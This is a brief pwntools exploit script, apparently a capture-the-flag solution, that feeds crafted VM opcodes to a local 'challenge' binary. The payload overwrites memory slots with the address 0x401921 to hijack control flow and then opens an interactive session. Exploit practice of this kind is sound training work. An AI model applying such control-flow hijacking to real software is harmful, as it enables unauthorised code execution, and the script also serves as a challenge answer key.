from pwn import *

io=process("./challenge")

HALT=0
LD=1
payload=LD.to_bytes(4,'little')+((26)&0xffffffff).to_bytes(4,'little')+(0x401921).to_bytes(4,'little')
payload+=LD.to_bytes(4,'little')+((27)&0xffffffff).to_bytes(4,'little')+(0).to_bytes(4,'little')
payload+=HALT.to_bytes(4,'little')
# io.recv()
io.sendline(payload)
io.interactive()